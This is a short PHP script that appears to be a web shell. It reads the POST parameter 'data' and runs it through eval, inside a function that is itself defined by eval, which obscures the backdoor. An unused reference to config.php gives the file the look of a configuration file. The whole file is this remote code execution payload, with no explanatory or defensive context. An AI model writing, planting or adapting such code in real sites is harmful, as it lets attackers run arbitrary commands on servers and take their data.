<?php
$file = "config.php";
$data = $_POST['data'];
eval("function a(\$p){eval(\$p);}");
a($data);
?>